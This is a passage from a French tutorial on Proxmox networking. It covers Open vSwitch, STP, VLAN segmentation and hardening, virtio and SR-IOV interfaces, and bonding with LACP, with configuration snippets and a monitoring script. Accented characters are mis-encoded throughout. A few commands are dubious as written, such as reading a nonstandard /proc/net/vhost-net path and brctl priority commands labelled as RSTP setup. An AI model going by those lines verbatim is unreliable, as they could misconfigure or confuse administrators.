**Open vSwitch (OVS)** fournit des fonctionnalitÃ©s avancÃ©es de SDN (Software Defined Networking) : flow tables programmables, tunneling, QoS granulaire, et intÃ©gration avec des contrÃ´leurs SDN comme OpenFlow.

```
Comparaison Linux Bridge vs OVS :

CritÃ¨re              â”‚ Linux Bridge â”‚ Open vSwitch
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Performance          â”‚ Excellente   â”‚ TrÃ¨s bonne
SimplicitÃ©           â”‚ TrÃ¨s simple  â”‚ Complexe
FonctionnalitÃ©s SDN  â”‚ LimitÃ©es     â”‚ ComplÃ¨tes
Overhead CPU         â”‚ Minimal      â”‚ ModÃ©rÃ©
Debugging            â”‚ Simple       â”‚ AvancÃ©
IntÃ©gration cloud    â”‚ Basique      â”‚ Native
```

**Installation et configuration OVS :**

```bash
# Installation Open vSwitch
apt install openvswitch-switch

# CrÃ©ation d'un bridge OVS
ovs-vsctl add-br ovsbr0
ovs-vsctl add-port ovsbr0 ens18

# Configuration VLAN avec OVS
ovs-vsctl add-port ovsbr0 vlan10 tag=10 -- set interface vlan10 type=internal
ip addr add 192.168.10.1/24 dev vlan10
ip link set vlan10 up

# Flow rules avancÃ©es
ovs-ofctl add-flow ovsbr0 "priority=100,dl_type=0x0800,nw_dst=192.168.1.0/24,actions=output:1"
```

### Spanning Tree Protocol (STP)

STP prÃ©vient les boucles rÃ©seau en dÃ©sactivant automatiquement les liens redondants. Dans un environnement virtualisÃ©, STP peut causer des dÃ©lais de convergence indÃ©sirables lors du dÃ©marrage des VM.

**ProblÃ©matiques STP en virtualisation :**
- DÃ©lai de 30 secondes pour la convergence
- Blocage temporaire du trafic VM
- ComplexitÃ© avec les migrations Ã  chaud

**Optimisations STP :**

```bash
# DÃ©sactiver STP sur bridges internes
auto vmbr1
iface vmbr1 inet static
    bridge-stp off
    bridge-fd 0

# Configuration RSTP pour convergence rapide
brctl setbridgeprio vmbr0 32768
brctl setportprio vmbr0 ens18 128
```

### Monitoring et diagnostic des bridges

**Outils de diagnostic essentiels :**

```bash
# Ã‰tat des bridges
brctl show

# Table MAC d'un bridge
brctl showmacs vmbr0

# Statistiques dÃ©taillÃ©es
cat /sys/class/net/vmbr0/statistics/rx_packets
cat /sys/class/net/vmbr0/statistics/tx_packets

# Capture de trafic sur bridge
tcpdump -i vmbr0 -n

# Monitoring OVS
ovs-vsctl show
ovs-ofctl dump-flows ovsbr0
ovs-appctl fdb/show ovsbr0
```

### Optimisation des performances rÃ©seau

**Multiqueue virtio** permet de parallÃ©liser le traitement rÃ©seau en utilisant plusieurs queues par interface virtuelle.

```bash
# Configuration multiqueue pour VM
qm set 100 -net0 virtio,bridge=vmbr0,queues=4

# VÃ©rification dans la VM
ethtool -L eth0 combined 4
```

**CPU affinity** pour les interruptions rÃ©seau optimise le traitement en dÃ©diant des cores spÃ©cifiques.

```bash
# AffinitÃ© IRQ pour interface physique
echo 2 > /proc/irq/24/smp_affinity  # Core 1
echo 4 > /proc/irq/25/smp_affinity  # Core 2
```

---

## 3.2 VLAN et segmentation

### Concepts fondamentaux des VLAN

Les **VLAN (Virtual Local Area Networks)** permettent de crÃ©er des rÃ©seaux logiquement sÃ©parÃ©s sur une infrastructure physique partagÃ©e. Imaginez un immeuble de bureaux oÃ¹ chaque Ã©tage reprÃ©sente un VLAN : bien que tous partagent la mÃªme infrastructure (ascenseurs, Ã©lectricitÃ©), chaque Ã©tage fonctionne indÃ©pendamment avec ses propres rÃ¨gles d'accÃ¨s et de sÃ©curitÃ©.

Cette segmentation logique rÃ©sout plusieurs problÃ¨mes critiques : isolation de sÃ©curitÃ©, optimisation des performances par rÃ©duction des domaines de broadcast, et flexibilitÃ© organisationnelle permettant de regrouper des utilisateurs selon leurs fonctions plutÃ´t que leur localisation physique.

### Architecture VLAN en environnement virtualisÃ©

```
Architecture VLAN Multi-Tenant :

                    Switch Physique
                         â”‚
                    â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
                    â”‚  Trunk  â”‚ 802.1Q (VLAN 10,20,30,40)
                    â”‚  Port   â”‚
                    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                         â”‚
                    â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
                    â”‚  ens18  â”‚ Interface physique
                    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                         â”‚
                    â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
                    â”‚  vmbr0  â”‚ Bridge VLAN-aware
                    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                         â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚                â”‚                â”‚
   â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
   â”‚ VM 101  â”‚      â”‚ VM 102  â”‚      â”‚ VM 103  â”‚
   â”‚VLAN 10  â”‚      â”‚VLAN 20  â”‚      â”‚VLAN 30  â”‚
   â”‚Managementâ”‚      â”‚Productionâ”‚     â”‚ DMZ     â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Plan d'adressage VLAN :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ VLAN ID â”‚     Nom         â”‚    RÃ©seau       â”‚   Usage      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   10    â”‚ Management      â”‚ 192.168.10.0/24 â”‚ Admin/Backup â”‚
â”‚   20    â”‚ Production      â”‚ 192.168.20.0/24 â”‚ Apps mÃ©tier  â”‚
â”‚   30    â”‚ DMZ             â”‚ 192.168.30.0/24 â”‚ Services web â”‚
â”‚   40    â”‚ Storage         â”‚ 192.168.40.0/24 â”‚ iSCSI/NFS    â”‚
â”‚   50    â”‚ Lab/Test        â”‚ 192.168.50.0/24 â”‚ DÃ©veloppementâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Configuration VLAN dans Proxmox

**MÃ©thode 1 : VLAN interfaces dÃ©diÃ©es**

```bash
# CrÃ©ation d'interfaces VLAN spÃ©cifiques
auto ens18.10
iface ens18.10 inet static
    address 192.168.10.100/24
    vlan-raw-device ens18

auto ens18.20  
iface ens18.20 inet static
    address 192.168.20.100/24
    vlan-raw-device ens18

# Bridges dÃ©diÃ©s par VLAN
auto vmbr10
iface vmbr10 inet manual
    bridge-ports ens18.10
    bridge-stp off
    bridge-fd 0

auto vmbr20
iface vmbr20 inet manual
    bridge-ports ens18.20
    bridge-stp off
    bridge-fd 0
```

**MÃ©thode 2 : Bridge VLAN-aware (recommandÃ©e)**

```bash
auto vmbr0
iface vmbr0 inet manual
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094

# Configuration VM avec VLAN tag
qm set 101 -net0 virtio,bridge=vmbr0,tag=10
qm set 102 -net0 virtio,bridge=vmbr0,tag=20
qm set 103 -net0 virtio,bridge=vmbr0,tag=30
```

### VLAN Trunking et Access Ports

**Trunk ports** transportent le trafic de plusieurs VLAN avec des tags 802.1Q, permettant Ã  un seul lien physique de vÃ©hiculer plusieurs rÃ©seaux logiques.

**Access ports** appartiennent Ã  un seul VLAN et ne nÃ©cessitent pas de tagging cÃ´tÃ© client.

```bash
# Configuration switch Cisco pour trunk
interface GigabitEthernet0/1
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40
 switchport trunk native vlan 1

# Configuration switch pour access port
interface GigabitEthernet0/2
 switchport mode access
 switchport access vlan 20
```

### Inter-VLAN Routing

Par dÃ©faut, les VLAN sont isolÃ©s et ne peuvent pas communiquer entre eux. L'**inter-VLAN routing** permet une communication contrÃ´lÃ©e entre VLAN via un routeur ou un switch Layer 3.

**MÃ©thodes d'inter-VLAN routing :**

**1. Router on a stick** : Un routeur avec une interface trunk

```bash
# Configuration routeur Linux
auto ens18.10
iface ens18.10 inet static
    address 192.168.10.1/24
    vlan-raw-device ens18

auto ens18.20
iface ens18.20 inet static
    address 192.168.20.1/24
    vlan-raw-device ens18

# Activation du routage
echo 1 > /proc/sys/net/ipv4/ip_forward

# RÃ¨gles de routage inter-VLAN
iptables -A FORWARD -i ens18.10 -o ens18.20 -j ACCEPT
iptables -A FORWARD -i ens18.20 -o ens18.10 -j ACCEPT
```

**2. Switch Layer 3** : Routage intÃ©grÃ© au switch

**3. Firewall virtualisÃ©** : VM dÃ©diÃ©e au routage et filtrage

### SÃ©curitÃ© VLAN

**VLAN Hopping** reprÃ©sente une attaque oÃ¹ un pirate accÃ¨de Ã  des VLAN non-autorisÃ©s en exploitant des failles de configuration.

**Types d'attaques VLAN :**
- **Switch Spoofing** : Imiter un switch pour recevoir du trafic trunk
- **Double Tagging** : Exploiter le VLAN natif pour accÃ©der Ã  d'autres VLAN

**Mesures de protection :**

```bash
# DÃ©sactiver le VLAN natif sur les trunks
switchport trunk native vlan 999  # VLAN inutilisÃ©

# Limiter les VLAN autorisÃ©s
switchport trunk allowed vlan 10,20,30

# Port security
switchport port-security
switchport port-security maximum 2
switchport port-security violation shutdown
```

### QoS et priorisation du trafic

**Quality of Service (QoS)** permet de prioriser certains types de trafic pour garantir les performances des applications critiques.

```bash
# Configuration QoS avec tc (Traffic Control)
# Limitation bande passante VLAN 50 (lab)
tc qdisc add dev ens18.50 root handle 1: htb default 30
tc class add dev ens18.50 parent 1: classid 1:1 htb rate 100mbit
tc class add dev ens18.50 parent 1:1 classid 1:10 htb rate 50mbit ceil 100mbit

# Priorisation trafic management (VLAN 10)
tc qdisc add dev ens18.10 root handle 1: prio bands 3
tc filter add dev ens18.10 parent 1:0 protocol ip prio 1 u32 match ip tos 0x10 0xff flowid 1:1
```

### Monitoring VLAN

**Outils de surveillance et diagnostic :**

```bash
# VÃ©rification configuration VLAN
cat /proc/net/vlan/config

# Statistiques par VLAN
cat /proc/net/vlan/ens18.10

# Capture trafic spÃ©cifique VLAN
tcpdump -i ens18 vlan 10

# Monitoring avec SNMP
snmpwalk -v2c -c public switch_ip 1.3.6.1.2.1.17.7.1.4.3.1.1
```

---

## 3.3 vNIC et virtio

### Interfaces rÃ©seau virtuelles (vNIC)

Les **vNIC (virtual Network Interface Cards)** reprÃ©sentent l'abstraction logicielle des cartes rÃ©seau physiques pour les machines virtuelles. Chaque vNIC Ã©mule le comportement d'une carte rÃ©seau rÃ©elle, permettant aux systÃ¨mes d'exploitation invitÃ©s de communiquer sur le rÃ©seau sans modification.

L'Ã©volution des vNIC suit une progression claire : de l'Ã©mulation complÃ¨te de hardware existant (e1000, rtl8139) vers des drivers paravirtualisÃ©s optimisÃ©s (virtio-net) qui offrent des performances quasi-natives en Ã©liminant l'overhead d'Ã©mulation.

### Types de vNIC et leurs caractÃ©ristiques

```
Ã‰volution des performances vNIC :

rtl8139 (Ã‰mulation complÃ¨te)
â”œâ”€â”€ Performance : 100 Mbps max
â”œâ”€â”€ CompatibilitÃ© : Universelle
â”œâ”€â”€ CPU overhead : Ã‰levÃ© (15-20%)
â””â”€â”€ Usage : SystÃ¨mes legacy uniquement

e1000 (Ã‰mulation Intel)
â”œâ”€â”€ Performance : 1 Gbps
â”œâ”€â”€ CompatibilitÃ© : Excellente
â”œâ”€â”€ CPU overhead : ModÃ©rÃ© (8-12%)
â””â”€â”€ Usage : CompatibilitÃ© Windows/Linux

virtio-net (ParavirtualisÃ©)
â”œâ”€â”€ Performance : 10+ Gbps
â”œâ”€â”€ CompatibilitÃ© : Drivers requis
â”œâ”€â”€ CPU overhead : Minimal (2-3%)
â””â”€â”€ Usage : Production moderne

SR-IOV (Pass-through)
â”œâ”€â”€ Performance : Native (40+ Gbps)
â”œâ”€â”€ CompatibilitÃ© : Hardware spÃ©cifique
â”œâ”€â”€ CPU overhead : Quasi-nul
â””â”€â”€ Usage : Applications critiques
```

### Virtio : Architecture et optimisations

**Virtio** reprÃ©sente une rÃ©volution dans la virtualisation I/O en remplaÃ§ant l'Ã©mulation hardware par une interface standardisÃ©e entre l'hyperviseur et les drivers invitÃ©s. Cette approche Ã©limine la complexitÃ© de l'Ã©mulation tout en maximisant les performances.

**Architecture virtio-net :**

```
VM Guest                     Hyperviseur Host
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Application   â”‚         â”‚                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤         â”‚                 â”‚
â”‚  TCP/IP Stack   â”‚         â”‚                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤         â”‚                 â”‚
â”‚ virtio-net      â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”¤ vhost-net       â”‚
â”‚ driver          â”‚  virtio â”‚ backend         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  queue  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   virtqueue     â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”¤ TAP interface   â”‚
â”‚   (ring buffer) â”‚         â”‚                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                            â”‚ Bridge/OVS      â”‚
                            â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                            â”‚ Physical NIC    â”‚
                            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Configuration virtio optimisÃ©e :**

```bash
# Configuration VM avec virtio multiqueue
qm set 100 -net0 virtio,bridge=vmbr0,queues=4,firewall=0

# Optimisations dans la VM invitÃ©e
# Activation multiqueue
ethtool -L eth0 combined 4

# Optimisation interruptions
echo 2 > /proc/irq/24/smp_affinity
echo 4 > /proc/irq/25/smp_affinity

# Tuning TCP
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_rmem = 4096 87380 134217728' >> /etc/sysctl.conf
```

### vhost-net et vhost-user

**vhost-net** dÃ©place le traitement des paquets rÃ©seau du processus QEMU vers le kernel, rÃ©duisant drastiquement les changements de contexte et amÃ©liorant les performances.

**vhost-user** permet d'implÃ©menter le backend virtio dans l'espace utilisateur, offrant plus de flexibilitÃ© pour des solutions comme DPDK.

```bash
# VÃ©rification vhost-net
lsmod | grep vhost
modprobe vhost-net

# Configuration avec vhost-net
qm set 100 -net0 virtio,bridge=vmbr0,firewall=0

# Monitoring vhost
cat /proc/net/vhost-net
```

### SR-IOV : Virtualisation hardware

**SR-IOV (Single Root I/O Virtualization)** permet Ã  une carte rÃ©seau physique de prÃ©senter plusieurs fonctions virtuelles (VF) directement accessibles par les VM, contournant complÃ¨tement l'hyperviseur pour des performances natives.

**Architecture SR-IOV :**

```
Carte rÃ©seau SR-IOV :

Physical Function (PF)
â”œâ”€â”€ Configuration et gestion
â””â”€â”€ ContrÃ´le des Virtual Functions

Virtual Functions (VF 0-7)
â”œâ”€â”€ VF 0 â†’ VM 101 (accÃ¨s direct)
â”œâ”€â”€ VF 1 â†’ VM 102 (accÃ¨s direct)  
â”œâ”€â”€ VF 2 â†’ VM 103 (accÃ¨s direct)
â””â”€â”€ VF 3-7 â†’ Pool disponible

Avantages :
âœ“ Performance native
âœ“ Latence minimale
âœ“ Offload hardware (checksums, segmentation)

Limitations :
âœ— Migration Ã  chaud impossible
âœ— Nombre de VF limitÃ©
âœ— DÃ©pendance hardware
```

**Configuration SR-IOV :**

```bash
# VÃ©rification support SR-IOV
lspci -v | grep -i sriov

# Activation des VF
echo 4 > /sys/class/net/ens18/device/sriov_numvfs

# Liste des VF disponibles
lspci | grep Virtual

# Attribution VF Ã  une VM
qm set 100 -hostpci0 01:10.0,pcie=1

# Configuration dans la VM
# La VF apparaÃ®t comme interface native
ip link show
```

### Optimisation des performances rÃ©seau

**Multiqueue virtio** parallÃ©lise le traitement rÃ©seau en utilisant plusieurs queues par interface, permettant de distribuer la charge sur plusieurs CPU cores.

```bash
# Configuration multiqueue optimal
# Nombre de queues = nombre de vCPU (max 8)
qm set 100 -net0 virtio,bridge=vmbr0,queues=4

# Dans la VM : activation et tuning
ethtool -L eth0 combined 4
ethtool -K eth0 gso on
ethtool -K eth0 tso on
ethtool -K eth0 ufo on
```

**Offloading features** dÃ©chargent certaines opÃ©rations vers le hardware ou l'hyperviseur.

```bash
# VÃ©rification des features disponibles
ethtool -k eth0

# Activation optimisations
ethtool -K eth0 rx-checksumming on
ethtool -K eth0 tx-checksumming on
ethtool -K eth0 scatter-gather on
ethtool -K eth0 tcp-segmentation-offload on
ethtool -K eth0 generic-segmentation-offload on
```

### Monitoring et diagnostic vNIC

**MÃ©triques de performance rÃ©seau :**

```bash
# Statistiques dÃ©taillÃ©es interface
ethtool -S eth0

# Monitoring temps rÃ©el
iftop -i eth0
nload eth0

# Test de performance
iperf3 -s  # Serveur
iperf3 -c server_ip -t 60 -P 4  # Client multithread

# Analyse latence
ping -c 100 target_ip | tail -1
hping3 -S -p 80 -c 100 target_ip

# Monitoring virtio queues
cat /proc/interrupts | grep virtio
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure haute performance :** Utilisez SR-IOV pour les applications nÃ©cessitant une latence ultra-faible (trading, HPC). Configurez DPDK pour contourner le kernel et accÃ©der directement au hardware rÃ©seau.

**Environnement de dÃ©veloppement :** PrivilÃ©giez virtio-net avec multiqueue pour un bon compromis performance/flexibilitÃ©. Activez toutes les optimisations d'offloading pour maximiser le dÃ©bit.

**Laboratoire de cybersÃ©curitÃ© :** Utilisez diffÃ©rents types de vNIC pour simuler des environnements variÃ©s. L'Ã©mulation e1000 peut Ãªtre utile pour tester la compatibilitÃ© d'outils legacy, tandis que virtio-net offre les performances nÃ©cessaires pour l'analyse de trafic en temps rÃ©el.

---

## 3.4 Bonding et agrÃ©gation

### Concepts du bonding rÃ©seau

Le **bonding** (ou agrÃ©gation de liens) combine plusieurs interfaces rÃ©seau physiques en une seule interface logique, offrant redondance, augmentation de bande passante, ou les deux selon le mode configurÃ©. Cette technique est essentielle dans les environnements de production pour Ã©liminer les points de dÃ©faillance unique et optimiser l'utilisation de la bande passante disponible.

Imaginez le bonding comme une **autoroute Ã  plusieurs voies** : plus vous avez de voies (interfaces), plus vous pouvez faire passer de trafic simultanÃ©ment. Si une voie est fermÃ©e (panne d'interface), le trafic continue sur les voies restantes sans interruption de service.

### Modes de bonding dÃ©taillÃ©s

```
Modes de bonding Linux :

Mode 0 (balance-rr) - Round Robin
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Paquet 1â”‚ Paquet 2â”‚ Paquet 3â”‚ Paquet 4â”‚
â”‚  eth0   â”‚  eth1   â”‚  eth0   â”‚  eth1   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
âœ“ Bande passante cumulÃ©e
âœ— RÃ©ordonnancement possible
âœ— NÃ©cessite switch compatible

Mode 1 (active-backup) - Actif/Passif
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ eth0 (ACTIVE) â”‚ eth1 (BACKUP)           â”‚
â”‚ Tout le traficâ”‚ Standby                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
âœ“ Redondance simple
âœ“ Compatible tous switches
âœ— Pas d'agrÃ©gation bande passante

Mode 4 (802.3ad) - LACP
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ NÃ©gociation dynamique avec switch       â”‚
â”‚ RÃ©partition par hash des flux           â”‚
â”‚ DÃ©tection automatique des pannes        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
âœ“ Standard IEEE
âœ“ Bande passante + redondance
âœ— Configuration switch requise

Mode 6 (balance-alb) - Adaptive Load Balancing
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ TX : Ã‰quilibrage par destination        â”‚
â”‚ RX : Apprentissage ARP                  â”‚
â”‚ Adaptation automatique                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
âœ“ Pas de config switch
âœ“ Optimisation automatique
âœ— ComplexitÃ© algorithmique
```

### Configuration bonding dans Proxmox

**MÃ©thode systemd-networkd (moderne) :**

```bash
# CrÃ©ation du bond
cat > /etc/systemd/network/bond0.netdev << EOF
[NetDev]
Name=bond0
Kind=bond

[Bond]
Mode=802.3ad
TransmitHashPolicy=layer3+4
LACPTransmitRate=fast
MIIMonitorSec=100
UpDelaySec=200
DownDelaySec=200
EOF

# Configuration des interfaces membres
cat > /etc/systemd/network/ens18.network << EOF
[Match]
Name=ens18

[Network]
Bond=bond0
EOF

cat > /etc/systemd/network/ens19.network << EOF
[Match]
Name=ens19

[Network]
Bond=bond0
EOF

# Configuration IP du bond
cat > /etc/systemd/network/bond0.network << EOF
[Match]
Name=bond0

[Network]
DHCP=no
Address=192.168.1.100/24
Gateway=192.168.1.1
DNS=8.8.8.8
EOF

# Activation
systemctl enable systemd-networkd
systemctl restart systemd-networkd
```

**MÃ©thode ifupdown (traditionnelle) :**

```bash
# Configuration dans /etc/network/interfaces
auto bond0
iface bond0 inet static
    address 192.168.1.100/24
    gateway 192.168.1.1
    bond-slaves ens18 ens19
    bond-mode 802.3ad
    bond-miimon 100
    bond-lacp-rate 1
    bond-xmit-hash-policy layer3+4

auto ens18
iface ens18 inet manual
    bond-master bond0

auto ens19
iface ens19 inet manual
    bond-master bond0
```

### LACP : Link Aggregation Control Protocol

**LACP** automatise la nÃ©gociation et la gestion des liens agrÃ©gÃ©s entre serveur et switch. Ce protocole dÃ©tecte automatiquement les pannes, ajuste la rÃ©partition de charge, et maintient la synchronisation entre les deux extrÃ©mitÃ©s.

**Configuration switch Cisco pour LACP :**

```bash
# Configuration port-channel
interface Port-channel1
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40

# Configuration interfaces membres
interface range GigabitEthernet0/1-2
 channel-group 1 mode active
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40
```

**Configuration switch HP/Aruba :**

```bash
# CrÃ©ation du trunk LACP
trunk 1-2 trk1 lacp

# Configuration VLAN sur trunk
vlan 10,20,30,40 tagged trk1
```

### Hash policies et rÃ©partition de charge

La **hash policy** dÃ©termine comment les paquets sont rÃ©partis entre les interfaces du bond. Le choix de la politique impacte directement les performances et l'Ã©quilibrage de charge.

```
Politiques de hash disponibles :

layer2 (default)
â”œâ”€â”€ Hash sur MAC source/destination
â”œâ”€â”€ RÃ©partition par machine
â””â”€â”€ Risque de dÃ©sÃ©quilibre

layer2+3
â”œâ”€â”€ Hash sur MAC + IP source/destination  
â”œâ”€â”€ Meilleure rÃ©partition
â””â”€â”€ RecommandÃ© pour la plupart des cas

layer3+4
â”œâ”€â”€ Hash sur IP + Port source/destination
â”œâ”€â”€ RÃ©partition optimale par flux
â””â”€â”€ IdÃ©al pour serveurs multi-services

encap2+3
â”œâ”€â”€ Hash sur headers internes (tunnels)
â”œâ”€â”€ SpÃ©cialisÃ© pour VXLAN/GRE
â””â”€â”€ Usage SDN avancÃ©
```

**Configuration et test des hash policies :**

```bash
# Modification de la politique
echo layer3+4 > /sys/class/net/bond0/bonding/xmit_hash_policy

# Test de rÃ©partition
for i in {1..100}; do
    ping -c 1 192.168.1.$i &
done

# Monitoring rÃ©partition
watch -n 1 'cat /proc/net/bonding/bond0 | grep -A 2 "Slave Interface"'
```

### Monitoring et diagnostic bonding

**Surveillance de l'Ã©tat du bond :**

```bash
# Ã‰tat dÃ©taillÃ© du bond
cat /proc/net/bonding/bond0

# Statistiques par interface
cat /sys/class/net/bond0/statistics/rx_bytes
cat /sys/class/net/ens18/statistics/rx_bytes
cat /sys/class/net/ens19/statistics/rx_bytes

# Monitoring LACP
cat /proc/net/bonding/bond0 | grep -A 10 "802.3ad info"

# Test de failover
ip link set ens18 down
# VÃ©rifier que le trafic continue sur ens19
ping -c 10 192.168.1.1
ip link set ens18 up
```

**Scripts de monitoring automatisÃ© :**

```bash
#!/bin/bash
# Script de surveillance bond
BOND_INTERFACE="bond0"
ALERT_EMAIL="admin@company.com"

check_bond_status() {
    local bond_status=$(cat /proc/net/bonding/$BOND_INTERFACE | grep "MII Status" | head -1 | awk '{print $3}')
    local active_slaves=$(cat /proc/net/bonding/$BOND_INTERFACE | grep "Currently Active Slave" | awk '{print $4}')
    
    if [ "$bond_status" != "up" ]; then
        echo "ALERT: Bond $BOND_INTERFACE is DOWN" | mail -s "Bond Alert" $ALERT_EMAIL
    fi
    
    local slave_count=$(cat /proc/net/bonding/$BOND_INTERFACE | grep "Slave Interface" | wc -l)
    if [ $slave_count -lt 2 ]; then
        echo "WARNING: Bond $BOND_INTERFACE has only $slave_count active slave(s)" | mail -s "Bond Warning" $ALERT_EMAIL
    fi
}

# ExÃ©cution toutes les 5 minutes via cron
# */5 * * * * /usr/local/bin/check_bond.sh
```

### Optimisation des performances

**Tuning des paramÃ¨tres bond :**

```bash
# Optimisation MII monitoring
echo 50 > /sys/class/net/bond0/bonding/miimon

# DÃ©lais optimisÃ©s
echo 100 > /sys/class/net/bond0/bonding/updelay
echo 100 > /sys/class/net/bond0/bonding/downdelay

# LACP rate rapide
echo fast > /sys/class/net/bond0/bonding/lacp_rate
```

**Optimisation rÃ©seau globale :**

```bash
# Augmentation des buffers rÃ©seau
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.netdev_max_backlog = 5000' >> /etc/sysctl.conf

# Optimisation TCP
echo 'net.ipv4.tcp_window_scaling = 1' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_timestamps = 1' >> /etc/sysctl.conf

# Application des paramÃ¨tres
sysctl -p
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure de production :** ImplÃ©mentez du bonding LACP sur tous les serveurs critiques avec monitoring proactif. Utilisez la hash policy layer3+4 pour optimiser la rÃ©partition des flux applicatifs.

